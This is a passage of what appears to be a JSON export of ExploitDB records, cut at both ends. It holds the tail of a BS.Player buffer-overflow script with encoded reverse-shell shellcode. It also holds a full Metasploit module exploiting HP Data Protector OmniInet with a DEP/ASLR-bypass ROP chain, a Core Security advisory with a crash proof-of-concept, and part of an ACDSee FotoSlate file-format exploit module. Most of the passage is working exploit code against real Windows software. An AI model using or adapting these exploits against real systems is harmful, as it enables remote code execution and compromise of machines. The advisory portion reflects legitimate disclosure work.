(\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n\t\"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBNKWY7N4PV9X6PQX1PV9JYNZ9SDMTZTR\" # \r\n\t\"83SY0KT01RPLLLCBPLLT2RLPJX9KKTOX3NZUKKV0VLK3Y3MLRONMMJU2VWC8VQKQSOPTZT3CTK1LPUR6\" #\r\n\t\"KZR65RJC7NPWDLVRZQUMFMV85BXR7BOG8SCKUNXUVMVGIPMKJJZ6XSQ40ORI2UTOWNWRXVF679XJWYPL\" #FROM METASPLOIT FRAMEWORK \r\n\t\"OU2QOXQNN0GGLNM3HJLRVWUSKO4OWMVOZKXLKLY2B3U1BQMPEBVMQEEFULKP12N8GHWH43CROTS2NPPD\" #\r\n\t\"QT0YXLS5MOM3OCKSRWPFLJWWN19PSXXOFKYD7KLN3WYMFFEJY7LO785W6C1TM7MOURUH7EOM1FZTEMOJ\" #SHELLCODE REVERSE_TCP_SHELL ON PORT 4444\r\n\t\"28TUN2LK0SKNTKKPHJSDRKLFONNC2620QXQTRFZUE3UGR8TOL5V3YO47PRSMMBURNNL9MNEHNELX5NOW\" #\r\n\t\"Q8C5UPOLK3BIRSQBOXVDD9STOI8LHBM1Y3PEPOKMQOMKRN8JZIJ3MPJ0VRRYY92VP0DLVJ3TVJFWKSKB\" #PROMPT:\r\n\t\"QCMXW7O30CRZRF7JK7JV4S2SRM9M5RRTOZZVFYQQDKKW1LY7S6LZFJLLZNXMJB685QOJGLNKNITOCZSK\" #\r\n\t\"QITVVPONFL6LN0O1RVBINM6OLML4XL0TNL6RRVN28UOKSULQJXYLLY9NLM57LVDS8NY2PMQ3MORRMHQD\" #C:\\>Telnet 127.0.0.1 4444\r\n\t\"BEINV9QY8U0MN1ZTUPPO3KGMVDOQWLNEUOJLWKE6UPNMBX12QURRNVJN78DYMXKOMHNA\")            # \r\n                                                                                       #\r\nif int(sys.argv[1]) == 1:\r\n        shellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n        \"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBIKY0NQ99GO3LLVRPHLXY2TMTL46QMNR\"\r\n        \"8P1SHN853YXKLKSSHQXL4TENPSHWL3599RX6VNCJUKCH4VNSMM25ZOJP2MLWORBZMMM1DJ5QVO9MQ9W4\"\r\n        \"V30ZUBQWZLFP5KELTXGCLKKMKLE2KZPNG9MOXKMNBNXMKVBK893KGOKSJXOPLPOMS8SR3UTPWKGHXOKT\"\r\n        \"CDN4CMOQG1C34R171NSXML5WVKE7QSN4XL5VJZQM5W8O669OMOK90J9KN0Q31VVLNNOCUN957X7SHNOP\"\r\n        \"YTP3KXWLE3O9XCKXJA\")\r\n\r\nprint \"[*]The Length Shellcode:\"+str(len(shellcode))\r\n\r\ntime.sleep(1)\r\n\r\nshellcode += \"\\x41\" * 5000\r\n\r\nfile = str(sys.argv[2])\r\n\r\npayload = buffer+nseh+seh+egg_hunter+junk+shellcode\r\n\r\nop = \"w\"\r\nprint \"[*]Creating Your File \"+file\r\ntime.sleep(1)\r\ntry:\r\n        f = open(file,op)\r\n        f.write(\"http://\"+payload)\r\n        f.close()\r\n        print \"[*]The File \"+file+\" was Successfully Created\"\r\nexcept:\r\n        print \"[*]Error Creating File \"+file",
                "description": "BS.Player 2.57 - Local Buffer Overflow (SEH Unicode)",
                "author": "C4SS!0 G0M3S",
                "_id": 15934,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-01-07T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: hp_omniinet_4.rb 13096 2011-07-04 22:33:47Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"HP OmniInet.exe Opcode 20 Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability found in HP Data Protector's OmniInet\r\n\t\t\t\tprocess.  By supplying a long string of data as the file path with opcode '20',\r\n\t\t\t\ta buffer overflow can occur when this data is being written on the stack where\r\n\t\t\t\tno proper bounds checking is done beforehand, which results arbitrary code\r\n\t\t\t\texecution under the context of SYSTEM.  This module is also made against systems\r\n\t\t\t\tsuch as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR\r\n\t\t\t\tenabled by default.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => \"$Revision: 13096 $\",\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Oren Isacson',  #Initial discovery, poc\r\n\t\t\t\t\t'muts',          #Initial poc of the ROP exploit w/ dookie\r\n\t\t\t\t\t'dookie',        #Initial poc of the ROP exploit w/ muts\r\n\t\t\t\t\t'sinn3r',        #MSF module with corelanc0d3r  (Also Thx to MC and HD)\r\n\t\t\t\t\t'corelanc0d3r',  #MSF module with sinn3r\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-1865' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.exploit-db.com/exploits/17468/' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],\r\n\t\t\t\t\t[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182' ],\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'        => \"\\x00\",\r\n\t\t\t\t\t'PrependEncoder'  => \"\\x66\\x81\\xc4\\xb8\\x0b\\x61\\x9d\", #add sp, 0xb88; popad; popfd\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => \"process\",\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t#If 'Max' gets too long (ie. 10000 bytes), we can get a busted heap\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on XP SP3 or Win Server 2003',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 2005,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on Win Server 2008',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 1993,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Jun 29 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options([Opt::RPORT(5555)], self.class)\r\n\tend\r\n\r\n\tdef nop\r\n\t\treturn make_nops(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\tconnect\r\n\r\n\t\t#mona.py tekniq\r\n\t\t#https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/\r\n\t\trop = [\r\n\t\t\t#Initial setup\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t#ROP begins here\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # Make EAX readable\r\n\t\t\t0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EBP\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # <- VirtualProtect() found in IAT\r\n\t\t\t0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0b,  # Slide, so next gadget would write to correct stack location\r\n\t\t\t0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EDI (filler)\r\n\t\t\tnop,         # will be patched at runtime (VP), then picked up into ESI\r\n\t\t\tnop,         # EBX (filler)\r\n\t\t\t0x7c376402,  # POP EBP # RETN (msvcr71.dll)\r\n\t\t\t0x7c345c30,  # ptr to push esp #  ret  (from MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0xfffff82f,  # size 20001 bytes\r\n\t\t\t0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffff,  # pop value into ebx\r\n\t\t\t0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\r\n\t\t\t0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\r\n\t\t\t0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34b8d8,  # ROP NOP (-> edi)\r\n\t\t\t0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\r\n\t\t\t0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x90909090,  # NOPS (-> eax)\r\n\t\t\t0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\r\n\t\t].pack('V*')\r\n\r\n\t\t#Overflowing path \"C:\\Program Files\\OmniBack\\bin\\\"\r\n\t\t#4807 bytes after target.ret, but we need to use less than that to avoid a busted heap\r\n\t\tsploit = ''\r\n\t\tsploit << rand_text_alpha(target['Offset']-sploit.length)\r\n\t\tsploit << [target.ret].pack('V*')\r\n\t\tsploit << rop\r\n\t\tsploit << payload.encoded\r\n\t\tsploit << rand_text_alpha(target['Max']-sploit.length)\r\n\r\n\t\tpkt  = ''\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << \"\\x41\\x41\"  #Length field place holder\r\n\t\tpkt << \"\\xff\\xfe\"\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x32\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 5)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\")\r\n\t\tpkt << Rex::Text.to_unicode(\"20\")  #Opcode\r\n\t\tpkt << \"\\x00\"\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 7)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\\x00\")\r\n\t\tpkt << sploit\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 16)\r\n\r\n\t\t#pkt length\r\n\t\tpkt[2,2] = [pkt.length-5].pack('n')\r\n\r\n\t\tprint_status(\"Sending packet to #{datastore['RHOST']}...\")\r\n\t\tsock.put(pkt)\r\n\r\n\t\t#Data Protector lags before triggering the vuln code\r\n\t\t#Long delay seems necessary to ensure we get a shell back\r\n\t\tselect(nil,nil,nil,20)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\nend",
                "description": "HP OmniInet.exe Opcode 20 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17490,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-07-04T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\n  Core Security Technologies - Corelabs Advisory\r\n       http://corelabs.coresecurity.com/\r\n\r\n  HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\n\r\n\r\n1. *Advisory Information*\r\n\r\nTitle: HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\nAdvisory ID: CORE-2011-0606\r\nAdvisory URL:\r\nhttp://www.coresecurity.com/content/HP-Data-Protector-EXECCMD-Vulnerability\r\nDate published: 2011-06-29\r\nDate of last update: 2011-06-29\r\nVendors contacted: HP\r\nRelease mode: Coordinated release\r\n\r\n\r\n2. *Vulnerability Information*\r\n\r\nClass: Remote stack overflow [CWE-120]\r\nImpact: Code execution\r\nRemotely Exploitable: Yes\r\nLocally Exploitable: No\r\nCVE Name: CVE-2011-1866\r\n\r\n\r\n3. *Vulnerability Description*\r\n\r\nHP Data Protector [1] is an automated backup and recovery software for\r\nsingle-server to enterprise environments. A vulnerability in HP Data\r\nProtector could allow a remote attacker to execute arbitrary code. The\r\nvulnerability is triggered by sending a request to port 5555 of a host\r\nrunning the \"data protector inet\" service, part of HP Data Protector.\r\n\r\n\r\n4. *Vulnerable packages*\r\n\r\n   . HP OpenView Storage Data Protector v6.20 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.11 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.10 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.00 (running on Windows).\r\n   . Previous versions may be affected, but were not tested.\r\n\r\n\r\n5. *Non-vulnerable packages*\r\n\r\n   . No fixes are available at the time of publication.\r\n\r\n\r\n6. *Vendor Information, Solutions and Workarounds*\r\n\r\nHP has issued a security bulletin with document ID c02872182 [2]\r\navailable through HP Support Center at http://www.hp.com/go/HPSC.\r\n\r\nThe latest version of HP Data Protector is vulnerable to this issue. HP\r\nhas provided the following procedure to mitigate this vulnerability:\r\n\r\n   1. Upgrade to Data Protector A.06.20 or subsequent.\r\n   2. Enable encrypted control communication services on cell server and\r\nall clients in cell.\r\n\r\n The upgrade is available for download from\r\nhttp://hp.com/go/dataprotector then under 'Product Information' click on\r\n'Trials and Demos'.\r\n\r\n\r\n7. *Credits*\r\n\r\nThis vulnerability was discovered and researched by Nahuel C. Riva from\r\nCore Security Technologies. Publication was coordinated by Carlos Sarraute.\r\n\r\n\r\n8. *Technical Description / Proof of Concept Code*\r\n\r\nThe following python script can be used to reproduce the bug.\r\n\r\n/-----\r\nimport sys\r\nimport socket\r\n\r\nfrom struct import pack\r\n\r\nip = sys.argv[1]\r\nport = int(sys.argv[2]) # default tcp port 5555\r\n\r\ntarget = (ip, port)\r\n\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(target)\r\n\r\npath = 'A' * 5000\r\n\r\npacket =  pack('<L', 0x20003220)\r\npacket += pack('<L', 0x00302000)\r\npacket += '\\x20'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('<L', 0x00432000)\r\npacket += pack('<L', 0x00303220)\r\npacket += '\\x20'\r\npacket += 'omnicheck.exe'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('>H', 0x0020) * 4\r\npacket += pack('<L', 0x30200030)\r\npacket += pack('>H', 0x0020)\r\npacket += path\r\npacket += pack('>H', 0x0000)\r\n\r\nplen = pack('>L', len(packet))\r\n\r\ns.send(plen + packet)\r\n\r\n- -----/\r\n By executing this script, the omniinet.exe process crashes in the\r\nfollowing EIP:\r\n\r\n/-----\r\n7C8285D3    8B0424           MOV EAX,DWORD PTR SS:[ESP]\r\n7C8285D6    8BE5             MOV ESP,EBP\r\n7C8285D8    5D               POP EBP\r\n7C8285D9    C3               RETN\r\n        \r\n- -----/\r\n This is part of a function inside the ntdll.dll library, however, if we\r\nlook the SEH chain, we can see that the SEH handler was overwritten with\r\nthe value 0x00410041 (the unicode value for \"AA\"):\r\n\r\n/-----\r\nSEH chain of thread 00000578\r\nAddress    SE handler\r\n009AFF94   omniinet.00410041\r\n00410041   A3004472\r\n        \r\n- -----/\r\n The following are the values of the CPU registers at the time of the\r\ncrash:\r\n\r\n/-----\r\nEAX C0000008\r\nECX 009AEC98\r\nEDX 7C82859C ntdll.KiRaiseUserExceptionDispatcher\r\nEBX 0015B480\r\nESP 009AEC44\r\nEBP 009AEC94\r\nESI 00155A80\r\nEDI 00000000\r\nEIP 7C8285D3 ntdll.7C8285D3\r\nC 0  ES 0023 32bit 0(FFFFFFFF)\r\nP 1  CS 001B 32bit 0(FFFFFFFF)\r\nA 0  SS 0023 32bit 0(FFFFFFFF)\r\nZ 0  DS 0023 32bit 0(FFFFFFFF)\r\nS 0  FS 003B 32bit 7FFDB000(FFF)\r\nT 0  GS 0000 NULL\r\nD 0\r\nO 0  LastErr ERROR_SUCCESS (00000000)\r\nEFL 00000206 (NO,NB,NE,A,NS,PE,GE,G)\r\nST0 empty 0.0\r\nST1 empty 0.0\r\nST2 empty 0.0\r\nST3 empty 0.0\r\nST4 empty 0.0\r\nST5 empty 0.0\r\nST6 empty 0.7610000000000000098\r\nST7 empty 1.0000000000000000000\r\n               3 2 1 0      E S P U O Z D I\r\nFST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)\r\nFCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1\r\n        \r\n- -----/\r\n The problem is in the 0041D170 function. This function does a blind\r\ncopy of the string passed in the packet as a path:\r\n\r\n/-----\r\n0041D170     /$ 55             PUSH EBP\r\n0041D171     |. 8BEC           MOV EBP,ESP\r\n0041D173     |. 51             PUSH ECX\r\n0041D174     |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D177     |. 8945 FC        MOV DWORD PTR SS:[EBP-4],EAX\r\n0041D17A     |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]\r\n0041D17D     |. 0FB711         MOVZX EDX,WORD PTR DS:[ECX]\r\n0041D180     |. 85D2           TEST EDX,EDX\r\n0041D182     |. 74 73          JE SHORT omniinet.0041D1F7\r\n[...]\r\n0041D1F7     |> 8B45 0C        /MOV EAX,DWORD PTR SS:[EBP+C]\r\n0041D1FA     |. 0FB708         |MOVZX ECX,WORD PTR DS:[EAX]\r\n0041D1FD     |. 85C9           |TEST ECX,ECX\r\n0041D1FF     |. 74 26          |JE SHORT omniinet.0041D227\r\n0041D201     |. 8B55 08        |MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D204     |. 8955 FC        |MOV DWORD PTR SS:[EBP-4],EDX\r\n0041D207     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D20A     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D20D     |. 66:8B11        |MOV DX,WORD PTR DS:[ECX]\r\n0041D210     |. 66:8910        |MOV WORD PTR DS:[EAX],DX // copy WORDs\r\nto the stack\r\n0041D213     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D216     |. 83C0 02        |ADD EAX,2\r\n0041D219     |. 8945 08        |MOV DWORD PTR SS:[EBP+8],EAX\r\n0041D21C     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D21F     |. 83C1 02        |ADD ECX,2\r\n0041D222     |. 894D 0C        |MOV DWORD PTR SS:[EBP+C],ECX\r\n0041D225     |.^EB D0          \\JMP SHORT omniinet.0041D1F7\r\n0041D227     |> 8B55 08        MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D22A     |. 66:C702 0000   MOV WORD PTR DS:[EDX],0\r\n0041D22F     |. 8B45 FC        MOV EAX,DWORD PTR SS:[EBP-4]\r\n0041D232     |. 8BE5           MOV ESP,EBP\r\n0041D234     |. 5D             POP EBP\r\n0041D235     \\. C3             RETN\r\n        \r\n- -----/\r\n\r\n\r\n\r\n9. *Report Timeline*\r\n\r\n. 2011-06-06:\r\nCore Security Technologies notifies the HP team of the vulnerabilities\r\nand provides the technical details. Publication date is temporarily set\r\nto July 5th, 2011.\r\n\r\n. 2011-06-06:\r\nVendor confirms that a new case was assigned within HP Software Security\r\nResponse Team (SSRT).\r\n\r\n. 2011-06-16:\r\nCore requests an update on this issue, in particular Core asks the\r\nvendor for a technical analysis of the bugs, a list of affected products\r\nand versions, and the vendor's plan for providing a fix (no reply\r\nreceived).\r\n\r\n. 2011-06-23:\r\nCore requests once more an update.\r\n\r\n. 2011-06-28:\r\nVendor communicates that a security bulletin will be issued on the same\r\nday (June 28). The vendor confirms the vulnerabilities, and recommends\r\nas mitigation to enable encrypted communications in the cell server and\r\nclient.\r\n\r\n. 2011-06-28:\r\nCore requests a link to the vendor's bulletin, and asks whether CVE ids\r\nhave been assigned.\r\n\r\n. 2011-06-28:\r\nVendor provides a link to the bulletin and CVE names for the\r\nvulnerabilities.\r\n\r\n. 2011-06-29:\r\nAdvisory CORE-2011-0606 is published.\r\n\r\n\r\n\r\n10. *References*\r\n\r\n[1] HP Data Protector http://hp.com/go/dataprotector\r\n[2] HPSBMU02686 SSRT100541 rev.2 - HP OpenView Storage Data Protector,\r\nRemote Execution of Arbitrary Code\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182\r\n\r\n\r\n11. *About CoreLabs*\r\n\r\nCoreLabs, the research center of Core Security Technologies, is charged\r\nwith anticipating the future needs and requirements for information\r\nsecurity technologies. We conduct our research in several important\r\nareas of computer security including system vulnerabilities, cyber\r\nattack planning and simulation, source code auditing, and cryptography.\r\nOur results include problem formalization, identification of\r\nvulnerabilities, novel solutions and prototypes for new technologies.\r\nCoreLabs regularly publishes security advisories, technical papers,\r\nproject information and shared software tools for public use at:\r\nhttp://corelabs.coresecurity.com.\r\n\r\n\r\n12. *About Core Security Technologies*\r\n\r\nCore Security Technologies enables organizations to get ahead of threats\r\nwith security test and measurement solutions that continuously identify\r\nand demonstrate real-world exposures to their most critical assets. Our\r\ncustomers can gain real visibility into their security standing, real\r\nvalidation of their security controls, and real metrics to more\r\neffectively secure their organizations.\r\n\r\nCore Security's software solutions build on over a decade of trusted\r\nresearch and leading-edge threat expertise from the company's Security\r\nConsulting Services, CoreLabs and Engineering groups. Core Security\r\nTechnologies can be reached at +1 (617) 399-6980 or on the Web at:\r\nhttp://www.coresecurity.com.\r\n\r\n\r\n13. *Disclaimer*\r\n\r\nThe contents of this advisory are copyright (c) 2011 Core Security\r\nTechnologies and (c) 2011 CoreLabs, and are licensed under a Creative\r\nCommons Attribution Non-Commercial Share-Alike 3.0 (United States)\r\nLicense: http://creativecommons.org/licenses/by-nc-sa/3.0/us/\r\n\r\n\r\n14. *PGP/GPG Keys*\r\n\r\nThis advisory has been signed with the GPG key of Core Security\r\nTechnologies advisories team, which is available for download at\r\nhttp://www.coresecurity.com/files/attachments/core_security_advisories.asc.\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.9 (MingW32)\r\n\r\niEYEARECAAYFAk4LnZsACgkQyNibggitWa07/ACfSlzkBvbowAskeP/K4FqtxCay\r\nEAkAnRCPKdc35t5Cb0ZJbGy4me4JRALo\r\n=zHon\r\n-----END PGP SIGNATURE-----",
                "description": "HP Data Protector 6.20 - EXEC_CMD Buffer Overflow",
                "author": "Core Security",
                "_id": 17461,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-06-30T00:00:00+00:00",
                "cve": [
                    "CVE-2011-1866"
                ],
                "type": "dos",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: acdsee_fotoslate_string.rb 13853 2011-10-10 16:47:33Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::FILEFORMAT\r\n\tinclude Msf::Exploit::Remote::Seh\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'ACDSee FotoSlate PLP File id Parameter Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via\r\n\t\t\t\ta specially crafted id parameter in a String element.  When viewing a malicious\r\n\t\t\t\tPLP file with the ACDSee FotoSlate product, a remote attacker could overflow a\r\n\t\t\t\tbuffer and execute arbitrary code. This exploit has been tested on systems such as\r\n\t\t\t\tWindows XP SP3, Windows Vista, and Windows 7.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Parvez Anwar', # Vulnerability discovery\r\n\t\t\t\t\t'juan vazquez'  # Metasploit module\r\n\t\t\t\t],\r\n\t\t\t'Version'        => '$Revision: 13853 $',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-2595' ],\r\n\t\t\t\t\t[ 'OSVDB', '75425' ],\r\n\t\t\t\t\t[ 'BID', '49558' ],\r\n\t\t\t\t],\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'process',\r\n\t\t\t\t\t'DisablePayloadHandler' => 'true'\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t#'Space'    => 4000,\r\n\t\t\t\t\t'BadChars' => \"\\x00\\x22\"\r\n\t\t\t\t},\r\n\t\t\t'Platform' => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'ACDSee FotoSlate 4.0 Build 146',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'         => 0x263a5b57, # pop, pop, ret from ipwssl6.dll\r\n\t\t\t\t\t\t\t'Offset'      => 1812,\r\n\t\t\t\t\t\t\t'TotalLength' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => 'Sep 12 2011',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOptString.new('FILENAME', [ true, 'The file name.',  'msf.plp']),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\toverflow = rand_text(target[\"Offset\"])\r\n\t\toverflow << generate_seh_record(target.ret)\r\n\t\toverflow << payload.encoded\r\n\t\toverflow << rand_text_alpha(target[\"TotalLength\"] - overflow.length)\r\n\r\n\t\tplp =<<TEMPLATE\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<ACDFotoSlateDocument15>\r\n<PageDefinition>\r\n<Template>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Properties>\r\n<String id=\"#{overflow}\"></String>\r\n<String id=\"Width\">8.500000IN</String>\r\n<String id=\"Height\">11.000000IN</String>\r\n<String id=\"Orientation\">Portrait</String>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Bool id=\"AutoFill\">FALSE</Bool>\r\n</Properties>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Properties>\r\n<String id=\"XPos\">0.500000IN</String>\r\n<String id=\"YPos\">0.500000IN</String>\r\n<String id=\"Width\">7.500000IN</String>\r\n<String id=\"Height\">10.000000IN</String>\r\n<Float id=\"Tilt\">0.000000</Float>\r\n</Properties>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool 